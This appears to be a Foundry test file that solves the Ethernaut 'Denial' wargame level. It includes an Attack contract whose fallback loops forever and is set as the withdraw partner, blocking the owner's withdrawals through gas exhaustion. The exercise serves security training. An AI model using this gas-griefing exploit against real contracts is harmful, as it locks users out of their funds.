// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/20-Denial/DenialFactory.sol";
import "../src/Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testDenialHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DenialFactory factory = new DenialFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Denial level = Denial(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Attack hack = new Attack();
        level.setWithdrawPartner(address(hack));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    fallback() external payable {
        while(true) {}
    }
}